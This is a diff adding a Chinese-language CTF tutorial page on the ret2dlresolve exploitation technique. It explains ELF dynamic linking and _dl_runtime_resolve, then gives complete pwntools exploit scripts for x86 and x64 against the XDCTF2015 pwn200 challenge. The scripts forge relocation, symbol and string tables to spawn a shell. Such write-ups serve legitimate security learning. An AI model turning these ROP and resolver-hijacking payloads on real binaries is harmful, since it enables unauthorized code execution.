@@ -1,0 +1,533 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="d69e872cabb8dc82645c15af09ad71d6">基本概念</h1>
+<p>以例子来说明一些概念：</p>
+<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+   <span class="n">puts</span><span class="p">(</span><span class="s">"Hello Pwn</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="c1">//gcc -m32 -fno-stack-protector -no-pie -s hellopwn.c</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230306154435-bd91f824-bbf2-1.png"/><br/>
+动调一下：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230306154447-c49e77c8-bbf2-1.png"/><br/>
+跟进puts，看到jmp到了一个并不是libc的地址，正是因为延迟绑定。然后push了一个0，再push了一个0x80482d0地址，最后跳到_dl_runtime_resolve去执行。<br/>
+<code>_dl_runtime_resolve(link_map,reloc_arg)</code></p>
+<p>先说<code>0x80482d0</code>，是link_map的地址，其结构包含了<code>.dynamic</code>指针，通过link_map，_dl_runtime_resolve可以访问到.dynamic这个section。</p>
+<p>再来看一些比较重要的section</p>
+<ul>
+<li>.dynamic</li>
+</ul>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230306154539-e3fb1856-bbf2-1.png"/><br/>
+这个section包含了很多动态链接需要的信息，但是我们着重关注三个点：<br/>
+<code>DT_STRTAB</code>、<code>DT_SYMTAB</code>、<code>DT_JMPREL</code><br/>
+这三项跟别包含了指向对应section的指针：<br/>
+<code>.dynstr</code>、<code>.dynsym</code>、<code>.rel.plt</code></p>
+<pre><code>root@16-223:/pwn/ret2dlresolve# readelf -S hello
+There are 29 section headers, starting at offset 0x114c:
+
+Section Headers:
+  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
+  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
+  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
+  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
+  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4
+  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000020 04   A  5   0  4
+  [ 5] .dynsym           DYNSYM          080481cc 0001cc 000050 10   A  6   1  4
+  [ 6] .dynstr           STRTAB          0804821c 00021c 00004a 00   A  0   0  1
+  [ 7] .gnu.version      VERSYM          08048266 000266 00000a 02   A  5   0  2
+  [ 8] .gnu.version_r    VERNEED         08048270 000270 000020 00   A  6   1  4
+  [ 9] .rel.dyn          REL             08048290 000290 000008 08   A  5   0  4
+  [10] .rel.plt          REL             08048298 000298 000010 08  AI  5  24  4
+  [11] .init             PROGBITS        080482a8 0002a8 000023 00  AX  0   0  4
+  [12] .plt              PROGBITS        080482d0 0002d0 000030 04  AX  0   0 16
+  [13] .plt.got          PROGBITS        08048300 000300 000008 00  AX  0   0  8
+  [14] .text             PROGBITS        08048310 000310 000192 00  AX  0   0 16
+  [15] .fini             PROGBITS        080484a4 0004a4 000014 00  AX  0   0  4
+  [16] .rodata           PROGBITS        080484b8 0004b8 000013 00   A  0   0  4
+  [17] .eh_frame_hdr     PROGBITS        080484cc 0004cc 00002c 00   A  0   0  4
+  [18] .eh_frame         PROGBITS        080484f8 0004f8 0000cc 00   A  0   0  4
+  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4
+  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4
+  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4
+  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4
+  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
+  [24] .got.plt          PROGBITS        0804a000 001000 000014 04  WA  0   0  4
+  [25] .data             PROGBITS        0804a014 001014 000008 00  WA  0   0  4
+  [26] .bss              NOBITS          0804a01c 00101c 000004 00  WA  0   0  1
+  [27] .comment          PROGBITS        00000000 00101c 000035 01  MS  0   0  1
+  [28] .shstrtab         STRTAB          00000000 001051 0000fa 00      0   0  1
+Key to Flags:
+  W (write), A (alloc), X (execute), M (merge), S (strings)
+  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)
+  O (extra OS processing required) o (OS specific), p (processor specific)</code></pre>
+<p>通过上述命令可以看到对应section的地址，可以看到和IDA给出的地址是一致的。</p>
+<ul>
+<li>.dynstr</li>
+</ul>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230306154557-ee3b0cea-bbf2-1.png"/><br/>
+这就是字符串表，index为0的值永远为0。下面就是动态链接用到的字符串(包括函数名)，每个均以0为结尾。引用时即以下标相对0x804821C来偏移。</p>
+<ul>
+<li>.dynsym</li>
+</ul>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230306154642-096a9850-bbf3-1.png"/><br/>
+符号表(结构体数组)，记录了符号信息，每个结构体对应一个符号。我们关心符号本身，例如puts。结构体如下:</p>
+<pre><code>typedef struct
+{
+  Elf32_Word    st_name; //符号名，是相对.dynstr起始的偏移，这种引用字符串的方式在前面说过了
+  Elf32_Addr    st_value;
+  Elf32_Word    st_size;
+  unsigned char st_info; //对于导入函数符号而言，它是0x12
+  unsigned char st_other;
+  Elf32_Section st_shndx;
+}Elf32_Sym; //对于导入函数符号而言，其他字段都是0</code></pre>
+<ul>
+<li>.rel.plt</li>
+</ul>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230306154653-0fe3cefe-bbf3-1.png"/><br/>
+重定位表(结构体数组)，每个结构体对应一个导入函数，结构体如下：</p>
+<pre><code>typedef struct
+{
+  Elf32_Addr    r_offset; //指向GOT表的指针
+  Elf32_Word    r_info;
+  //一些关于导入符号的信息，我们只关心从第二个字节开始的值((val)&gt;&gt;8)，忽略那个07
+  //1和3是这个导入函数的符号在.dynsym中的下标，
+  //如果往回看的话你会发现1和3刚好和.dynsym的puts和__libc_start_main对应
+} Elf32_Rel;</code></pre>
+<p>重定位表(结构体数组)，每个结构体对应一个导入函数，结构体如下：</p>
+<pre><code>typedef struct
+{
+  Elf32_Addr    r_offset; //指向GOT表的指针
+  Elf32_Word    r_info;
+  //一些关于导入符号的信息，我们只关心从第二个字节开始的值((val)&gt;&gt;8)，忽略那个07
+  //1和3是这个导入函数的符号在.dynsym中的下标，
+  //如果往回看的话你会发现1和3刚好和.dynsym的puts和__libc_start_main对应
+} Elf32_Rel;</code></pre>
+<h1 data-content="1" id="ca6752bb7da3a549755f21b686d76cf5">_dl_runtime_resolve</h1>
+<p>​<br/>
+说完基本概念，来看看<code>_dl_runtime_resolve(link_map,reloc_arg)</code>具体做了些什么。</p>
+<ol>
+<li>访问.dynamic，取出.dysym、.dystr、.rel.plt指针。</li>
+<li>.rel.plt+reloc_arg，求出当前函数的重定位表项Elf32_Rel的指针，记作rel。</li>
+<li>做rel-&gt;r_info &gt;&gt; 8运算作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym指针，记作sym。</li>
+<li>.dynstr + sym-&gt;st_name得出符号字符串指针。</li>
+<li>在动态链接库查找该函数地址，并将地址赋值给*rel-&gt;r_offset，即GOT表。</li>
+<li>调用该函数。<br/>
+​<br/>
+# x86-利用-1<br/>
+​<br/>
+当安全机制为No RELRO时才可利用(即.dynamic可写)，因要从.dynamic拿到.dynstr字符串表的指针加上偏移即函数名字符串，假设我们可以改写指针到可操作空间，即可修改正常函数偏移为想执行的函数，达到劫持程序流的目的。<br/>
+​<br/>
+看个例子：</li>
+</ol>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230306155020-8aef6e64-bbf3-1.png"/><br/>
+add功能，先calloc一个作为结构体，里面存放了下面calloc的chunk的地址，然后size可以自定义，再calloc一个chunk用来存内容。需要注意的是只读了1个字节，换算下来应该用p8来发送。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230306155032-92580d14-bbf3-1.png"/><br/>
+需要特别注意一下read这个函数，输入多少字节一定要补齐，不然不会继续接受下一步，例如0x20的chunk要输入满0x20，而不能习惯用4个字节代替。</p>
+<p>再来看edit:</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230306155044-996896be-bbf3-1.png"/><br/>
+重新输入了size，因此这里存在堆溢出的情况。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230306155058-a1aab5f0-bbf3-1.png"/><br/>
+free，经过动调这个函数有点迷。准确的说是chunk_list指针有点问题，修改0下标的修改不了。</p>
+<p>整个程序没有任何输出，只是存在堆溢出，可以通过修改struct chunk中的地址实现任意地址写。没有好的leak地址的方法，但是我们可以通过修改.dynstr来劫持程序。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230306155124-b14aa196-bbf3-1.png"/><br/>
+在bss段上先伪造一个.dynstr结构:</p>
+<pre><code>########################
+    new(0x10,'a'*0x10)#0
+    new(0x10,'b'*0x10)#1
+    new(0x10,'c'*0x10)#2
+    new(0x10,'/bin/sh\x00'.ljust(0x10,'d'))#3
+
+    fake_dynstr_address = 0x0000000006020E0
+    free_offset = 0x0000000000400457 - 0x00000000004003F8
+    libc_offset = 0x000000000040046B - 0x000000000040045E
+
+    fake_dynstr = b'\x00' * free_offset + b'system\x00'
+    fake_dynstr+= b'\x00' * libc_offset
+    fake_dynstr+= b'GLIBC_2.4\x00GLIBC_2.2.5\x00'
+
+    strtab = 0x601EA8 + 0x8
+
+    payload = b'A' * 0x10 + p64(0) + p64(0x21) + p64(0) + p64(fake_dynstr_address)
+    edit(1,len(payload),payload)</code></pre>
+<p>构造payload的时候要注意一个问题，因为dynstr是字符串，所以偏移计算要注意：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230306155138-b9691786-bbf3-1.png"/><br/>
+正常是free\x00字符串，修改成system\x00的话那么后面补0要从0x400457+7也就是0x40045E开始。</p>
+<p>通过edit(1)修改2下标chunk结构体中的指针:</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230306155159-c61c9a48-bbf3-1.png"/><br/>
+上图这个0x80是我测试的时候写测，正常0x10也ok。</p>
+<p>然后edit(2)，我们构造的fake_dynstr就会写到bss段上:<br/>
+<code>edit(2,len(fake_dynstr),fake_dynstr)</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230306155214-cf68e778-bbf3-1.png"/><br/>
+然后再修改dynamic中的strtab为我们伪造的这个地址:</p>
+<pre><code>payload = b'A' * 0x10 + p64(0) + p64(0x21) + p64(0) + p64(strtab)
+    edit(1,len(payload),payload)
+    edit(2,0x8,p64(fake_dynstr_address))</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230306155227-d6cc2fc0-bbf3-1.png"/><br/>
+修改成功，触发free即可（因为free还没有调用过，调用过如何利用看利用3）。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230306155241-df12d580-bbf3-1.png"/></p>
+<h1 data-content="1" id="4a7031704e491fc1b9da386f52259186">x86-利用-2</h1>
+<p>当dynamic不能写的时候，利用1就失效了，还有另外一种利用方式是修改_dl_runtime_resolve的第二个参数，再来看它的执行流程:</p>
+<ol>
+<li>访问.dynamic，取出.dysym、.dystr、.rel.plt指针。</li>
+<li>.rel.plt+reloc_arg，求出当前函数的重定位表项Elf32_Rel的指针，记作rel。</li>
+<li>做rel-&gt;r_info &gt;&gt; 8运算作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym指针，记作sym。</li>
+<li>.dynstr + sym-&gt;st_name得出符号字符串指针。</li>
+<li>在动态链接库查找该函数地址，并将地址赋值给*rel-&gt;r_offset，即GOT表。</li>
+<li>调用该函数。</li>
+</ol>
+<p>第二个过程中，若能控制reloc_arg，可以使rel指向一个可读写的区域，例如bss；<br/>
+第三个过程中，我们只要在伪造的rel内部放一个r_info，即可控制sym，一般r_info设置为0xXXXXXX07，其中XXXXXX为相对.dynsym的下标(不是偏移)，下标一般是offset/0x10(32位)，导入函数一般是07，因此用07结尾；<br/>
+第四个过程中，没有检查，所以字符串也可伪造。</p>
+<p>看个例题XDCTF2015_pwn200:</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230306155307-eeae8bc4-bbf3-1.png"/><br/>
+栈溢出，可以利用的只有write、read，strlen等函数，这个题其实用普通ret2libc也是ok的。<br/>
+Partial RELRO，dynamic不可写。</p>
+<p>1、栈迁移到BSS段</p>
+<pre><code>root@16-223:/pwn/ret2dlresolve# ROPgadget --binary bof --only "pop|ret"
+Gadgets information
+============================================================
+0x0804862b : pop ebp ; ret
+0x08048628 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+0x0804836d : pop ebx ; ret
+0x0804862a : pop edi ; pop ebp ; ret
+0x08048629 : pop esi ; pop edi ; pop ebp ; ret
+0x08048356 : ret
+0x0804846e : ret 0xeac1
+
+Unique gadgets found: 7
+
+root@16-223:/pwn/ret2dlresolve# ROPgadget --binary bof --only "leave|ret"
+Gadgets information
+============================================================
+0x08048445 : leave ; ret
+0x08048356 : ret
+0x0804846e : ret 0xeac1
+
+Unique gadgets found: 3</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230306155321-f6eb9282-bbf3-1.png"/></p>
+<pre><code>read = elf.plt['read']
+    write = elf.plt['write']
+    bss = elf.bss() + 0x800
+    pop_esi_edi_ebp_ret = 0x08048619
+    leave_ret = 0x08048458
+    pop_ebp_ret = 0x0804861b
+
+    vuln = 0x080484D6
+
+    gdb.attach(p,"b *0x08048519")
+    payload = b'A' * 112 + p32(read) + p32(pop_esi_edi_ebp_ret) + p32(0) + p32(bss) + p32(0x80)
+    payload+= p32(pop_ebp_ret) + p32(bss) + p32(leave_ret)
+    sda("XDCTF2015~!\n",payload)
+
+    sleep(2)
+    payload = b'BBBB'
+    payload+= p32(write) + p32(0) + p32(1) + p32(bss+0x50) + p32(0x8)
+    payload = payload.ljust(0x50,b'\x00') + b'/bin/sh\x00'
+    payload = payload.ljust(0x80,b'\x00')
+    sd(payload)</code></pre>
+<p>emm，一开始buu下的bof怎么都不执行write，后面调试发现不对劲...最后还是自己编译的ok。<br/>
+3个pop的原理很简单，执行完read(0,bss,0x80)后，三个参数还在栈上，因此需要3个pop弹出从而继续执行下面的pop_ebp_ret。<br/>
+为什么需要pop_ebp_ret呢，是因为3个pop的最后一个是pop_ebp，因此为了让ebp为bss的地址，需要再执行一个pop_ebp_ret。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230306155515-3b384796-bbf4-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230306155521-3ec780d4-bbf4-1.png"/><br/>
+2、控制程序执行plt_0的相关指令<br/>
+push link_map以及跳转到_dl_runtime_resolve。还需要提供write重定位表项在GOT表中的偏移，</p>
+<p>plt:（objdump -d -j .plt bof1）</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230306155532-44db836c-bbf4-1.png"/><br/>
+因此plt_0 = 0x08048380，write_index_offset  = 0x20  <code>80483c6:       68 20 00 00 00          push   $0x20</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230306155556-539fb3fa-bbf4-1.png"/><br/>
+ GOT 表的第 0 项（本例中 0x804a004）存储的就是 link_map 的地址。<br/>
+plt[0]的目的就是执行push以及jmp resolve，push的就是link_map，用0x20作为offset。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230306155610-5b96b928-bbf4-1.png"/></p>
+<pre><code>sleep(2)
+    plt_0 = 0x08048380
+    write_index_offset = 0x20
+    payload = b'BBBB'
+    payload+= p32(plt_0) + p32(write_index_offset) + p32(0) + p32(1) + p32(bss+0x50) + p32(0x8)
+    #payload+= p32(write) + p32(0) + p32(1) + p32(bss+0x50) + p32(0x8)
+    payload = payload.ljust(0x50,b'\x00') + b'/bin/sh\x00'
+    payload = payload.ljust(0x80,b'\x00')
+    sd(payload)</code></pre>
+<p>3、还是执行plt_0，这次控制offset指向我们伪造的地址</p>
+<p>r_info:（readelf -r bof1）</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230306155650-737decf0-bbf4-1.png"/><br/>
+因此write_rinfo = 0x0000607</p>
+<p>rel.plt:（objdump -s -j .rel.plt bof1）</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230306155657-7819c306-bbf4-1.png"/><br/>
+rel_plt = 0x8048330</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230306155704-7bce7046-bbf4-1.png"/></p>
+<pre><code>sleep(2)
+    plt_0 = 0x08048380
+    write_rinfo = 0x0000607
+    rel_plt = 0x8048330
+    index_offset = bss + 0x60 - rel_plt
+    write_got = elf.got['write']
+
+    payload = b'BBBB'
+    payload+= p32(plt_0) + p32(index_offset) + p32(0) + p32(1) + p32(bss+0x50) + p32(0x8)
+    #payload+= p32(write) + p32(0) + p32(1) + p32(bss+0x50) + p32(0x8)
+    payload = payload.ljust(0x50,b'\x00') + b'/bin/sh\x00'
+    payload = payload.ljust(0x60,b'\x00') + p32(write_got) + p32(write_rinfo)
+    payload = payload.ljust(0x80,b'\x00')
+    sd(payload)</code></pre>
+<p>我们在bss + 0x60的地方伪造了重定位表，仍然还是write，可以看到输出了字符串。</p>
+<p>4、伪造sym，使其指向我们控制的st_name</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230306155713-815c05be-bbf4-1.png"/><br/>
+st_name = 0x4c</p>
+<pre><code>#sleep(2)
+    plt_0 = 0x08048380
+    write_rinfo = 0x0000607
+    rel_plt = 0x8048330
+    index_offset = bss + 0x30 - rel_plt
+    write_got = elf.got['write']
+
+    dynsym = 0x80481D8
+    dynstr = 0x8048278
+    fake_sym_address = bss + 0x60
+    align = 0x10 - ((fake_sym_address - dynsym) &amp; 0xf)
+    fake_sym_address = fake_sym_address + align
+    write_rinfo = int((fake_sym_address - dynsym) / 0x10)
+    write_rinfo = (write_rinfo &lt;&lt; 8) | 0x7
+    st_name = 0x4c
+
+
+    payload = b'BBBB'
+    payload+= p32(plt_0) + p32(index_offset) + p32(0) + p32(1) + p32(bss+0x50) + p32(0x8)
+    payload = payload.ljust(0x30,b'\x00') + p32(write_got) + p32(write_rinfo)
+    #payload+= p32(write) + p32(0) + p32(1) + p32(bss+0x50) + p32(0x8)
+    payload = payload.ljust(0x50,b'\x00') + b'/bin/sh\x00'
+    payload = payload.ljust(0x60,b'\x00') + b'B' * align + p32(st_name) + p32(0) + p32(0) + p32(0x12)
+    payload = payload.ljust(0x80,b'\x00')
+    sd(payload)</code></pre>
+<p>先来看</p>
+<pre><code>fake_sym_address = bss + 0x60
+    align = 0x10 - ((fake_sym_address - dynsym) &amp; 0xf)
+    fake_sym_address = fake_sym_address + align</code></pre>
+<p>在bss+0x60处伪造dynsym，后面的aligin是因为Elf32_Sym结构体是0x10，为了对齐。例如我们在0x20处想伪造，真正的在0x12处，那么aligin=0x2，所以伪造的地址应该在0x22处。</p>
+<pre><code>write_rinfo = int((fake_sym_address - dynsym) / 0x10)
+    write_rinfo = (write_rinfo &lt;&lt; 8) | 0x7
+    st_name = 0x4c</code></pre>
+<p>write_info就是r_info，计算方法就是我们伪造的dynsym - 真正的，因为是下标所以除以0x10。</p>
+<p>那么这样，整个payload就清晰了：</p>
+<ol>
+<li>列表项首先跳转plt[0]，压入offset(我们伪造的rel的offset），即reloc_arg</li>
+<li>dl函数根据伪造的rel-&gt;r_info计算出我们伪造的dynsym下标。</li>
+<li>根据伪造的dymsym下标拿到st_name</li>
+</ol>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230306155727-89a0b062-bbf4-1.png"/><br/>
+这里我调整了一下fake_rel(bss+0x30)以及fake_sym(bss+0x60)的位置</p>
+<p>5、伪造st_name<br/>
+那么接下来，只要伪造st_name，即可getshell。<br/>
+考虑直接在/bin/sh字符串后面，因为还有空间.</p>
+<pre><code>fake_sym_address = bss + 0x60
+    align = 0x10 - ((fake_sym_address - dynsym) &amp; 0xf)
+    fake_sym_address = fake_sym_address + align
+    write_rinfo = int((fake_sym_address - dynsym) / 0x10)
+    write_rinfo = (write_rinfo &lt;&lt; 8) | 0x7
+    st_name = (bss + 0x50 + 0x8) - dynstr
+
+
+    payload = b'BBBB'
+    payload+= p32(plt_0) + p32(index_offset) + p32(0) + p32(bss+0x50)
+    payload = payload.ljust(0x30,b'\x00') + p32(write_got) + p32(write_rinfo)
+    #payload+= p32(write) + p32(0) + p32(1) + p32(bss+0x50) + p32(0x8)
+    payload = payload.ljust(0x50,b'\x00') + b'/bin/sh\x00' + b'system\x00'
+    payload = payload.ljust(0x60,b'\x00') + b'B' * align + p32(st_name) + p32(0) + p32(0) + p32(0x12)
+    payload = payload.ljust(0x80,b'\x00')
+    sd(payload)</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230306155739-90aa5746-bbf4-1.png"/><br/>
+最终payload:</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+
+context.terminal = ["tmux","splitw","-h"]
+context(arch='amd64',os='linux',log_level='debug')
+
+if(len(sys.argv) &lt; 2):
+    print("Usage:")
+    print("\tpython3 exploit [elf] [l r]")
+    exit(0)
+
+if(sys.argv[2]=='l'):
+    p = process('./'+sys.argv[1])
+    elf = ELF('./'+sys.argv[1])
+    libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
+else:
+    p = remote('node4.buuoj.cn','25733')
+    elf = ELF('./'+sys.argv[1])
+    #libc = ELF('./')
+
+
+
+sl = lambda x:p.sendline(x)
+sd = lambda x:p.send(x)
+sda = lambda x,y:p.sendafter(x,y)
+sla = lambda x,y:p.sendlineafter(x,y)
+rv = lambda x:p.recv(x)
+ru = lambda x:p.recvuntil(x)
+ia = lambda :p.interactive()
+debug = lambda x:print("[+] "+str(x))
+ru7f =  lambda : u64(ru(b'\x7f')[-6:].ljust(8,b'\x00'))
+ruf7 = lambda : u64(ru(b'\xf7')[-3:].ljust(4,b'\x00'))
+
+
+def pwn():
+    read = elf.plt['read']
+    write = elf.plt['write']
+    bss = elf.bss() + 0x800
+    pop_esi_edi_ebp_ret = 0x08048619
+    leave_ret = 0x08048458
+    pop_ebp_ret = 0x0804861b
+
+    #gdb.attach(p,"b *0x08048519")
+    payload = b'A' * 112 + p32(read) + p32(pop_esi_edi_ebp_ret) + p32(0) + p32(bss) + p32(0x80)
+    payload+= p32(pop_ebp_ret) + p32(bss) + p32(leave_ret)
+    sda("XDCTF2015~!\n",payload)
+
+
+    #sleep(2)
+    plt_0 = 0x08048380
+    write_rinfo = 0x0000607
+    rel_plt = 0x8048330
+    index_offset = bss + 0x30 - rel_plt
+    write_got = elf.got['write']
+
+    dynsym = 0x80481D8
+    dynstr = 0x8048278
+
+    fake_sym_address = bss + 0x60
+    align = 0x10 - ((fake_sym_address - dynsym) &amp; 0xf)
+    fake_sym_address = fake_sym_address + align
+    write_rinfo = int((fake_sym_address - dynsym) / 0x10)
+    write_rinfo = (write_rinfo &lt;&lt; 8) | 0x7
+    st_name = (bss + 0x50 + 0x8) - dynstr
+
+
+    payload = b'BBBB'
+    payload+= p32(plt_0) + p32(index_offset) + p32(0) + p32(bss+0x50)
+    payload = payload.ljust(0x30,b'\x00') + p32(write_got) + p32(write_rinfo)
+    #payload+= p32(write) + p32(0) + p32(1) + p32(bss+0x50) + p32(0x8)
+    payload = payload.ljust(0x50,b'\x00') + b'/bin/sh\x00' + b'system\x00'
+    payload = payload.ljust(0x60,b'\x00') + b'B' * align + p32(st_name) + p32(0) + p32(0) + p32(0x12)
+    payload = payload.ljust(0x80,b'\x00')
+    sd(payload)
+
+
+
+if __name__ == "__main__":
+
+    pwn()
+    ia()</code></pre>
+<h1 data-content="1" id="d3b7ae4b58b26e471c9955111df68a1d">x64-利用-1</h1>
+<p>x64的利用更加简单，因为是寄存器传参，不存在栈迁移的问题，同样还是用bof的代码。</p>
+<pre><code>root@16-223:/pwn/ret2dlresolve# ROPgadget --binary bof_x64_no --only 'pop|ret'
+Gadgets information
+============================================================
+0x000000000040076c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x000000000040076e : pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000400770 : pop r14 ; pop r15 ; ret
+0x0000000000400772 : pop r15 ; ret
+0x000000000040076b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x000000000040076f : pop rbp ; pop r14 ; pop r15 ; ret
+0x00000000004005a0 : pop rbp ; ret
+0x0000000000400773 : pop rdi ; ret
+0x0000000000400771 : pop rsi ; pop r15 ; ret
+0x000000000040076d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004004c9 : ret
+0x00000000004006ba : ret 0x4804
+0x00000000004006e0 : ret 0x8d48
+
+Unique gadgets found: 13</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230306155752-98c5d838-bbf4-1.png"/><br/>
+一样的思路，rop构造第一此read将sh字符串以及fake_dynstr写到bss上，第二次read将fake_dynstr的地址写进.dynamic中存档dynstr地址的地方，第三次调用plt_0(即dl_fixup)。</p>
+<p>说明一下为什么调用dl_fixup，因为所有函数都已调用过，只能重新调用dl_fixup来触发。</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+
+context.terminal = ["tmux","splitw","-h"]
+context(arch='amd64',os='linux',log_level='debug')
+
+if(len(sys.argv) &lt; 2):
+    print("Usage:")
+    print("\tpython3 exploit [elf] [l r]")
+    exit(0)
+
+if(sys.argv[2]=='l'):
+    p = process('./'+sys.argv[1])
+    elf = ELF('./'+sys.argv[1])
+    libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
+else:
+    p = remote('node4.buuoj.cn','25733')
+    elf = ELF('./'+sys.argv[1])
+    #libc = ELF('./')
+
+
+
+sl = lambda x:p.sendline(x)
+sd = lambda x:p.send(x)
+sda = lambda x,y:p.sendafter(x,y)
+sla = lambda x,y:p.sendlineafter(x,y)
+rv = lambda x:p.recv(x)
+ru = lambda x:p.recvuntil(x)
+ia = lambda :p.interactive()
+debug = lambda x:print("[+] "+str(x))
+ru7f =  lambda : u64(ru(b'\x7f')[-6:].ljust(8,b'\x00'))
+ruf7 = lambda : u64(ru(b'\xf7')[-3:].ljust(4,b'\x00'))
+
+
+def pwn():
+    read = elf.plt['read']
+    strlen = elf.plt['strlen']
+    pop_rdi_ret = 0x0000000000400773
+    pop_rsi_r15_ret = 0x0000000000400771
+    plt_0 = 0x00000000004004d0
+
+    bss = elf.bss() + 0x200
+    dynstr_address = 0x600980 + 0x8
+    fake_dynstr = b"\x00libc.so.6\x00stdin\x00system\x00"
+    fake_dynstr_address = bss + 0x10
+
+    payload = b'A' * 120
+    payload+= p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(bss) + p64(0) + p64(read)
+    payload+= p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(dynstr_address) + p64(0) + p64(read)
+    payload+= p64(pop_rdi_ret) + p64(bss) + p64(plt_0) + p64(1)
+
+    sla("Welcome to XDCTF2015~!\n",payload)
+
+    sleep(1)
+    payload = b'/bin/sh\x00'.ljust(0x10,b'\x00') + fake_dynstr
+    sl(payload)
+
+    #gdb.attach(p)
+    sleep(1)
+    payload = p64(fake_dynstr_address)
+    sl(payload)
+
+    #gdb.attach(p)
+
+
+if __name__ == "__main__":
+
+    pwn()
+    ia()</code></pre>
+<p>这里有必要说明一下为什么plt_0后面跟了个1，实际调试下来发现是作为_dl_fixup()的第二个参数:</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230306155822-aa6021de-bbf4-1.png"/><br/>
+最终刚好就是system字符串:</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230306155833-b0cfe22a-bbf4-1.png"/><br/>
+与我们伪造的dynstr有关。</p>
+<p>这里有两个疑问:</p>
+<ol>
+<li>为什么不通过寄存器直接传参(大概率是因为在调用dl_fixup前还有很多操作)。</li>
+<li>为什么是1？<br/>
+以上两个问题经过调试都没有找到答案。</li>
+</ol>
+<p>经过思考，既然作为dl_fixup的第二个参数，那么这个应该是reloc_arg:</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230306155846-b88b3384-bbf4-1.png"/><br/>
+可以看到strlen确实为1。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230306155854-bda264a0-bbf4-1.png"/><br/>
+只能根据上面这个图，看到调用dl_fixup前，把rbx+0x10位置的值给了rsi，作为reloc_arg，所以只能调试来看可控的话就在rbx+0x10的位置放上1。</p>
+</div>
+</div>
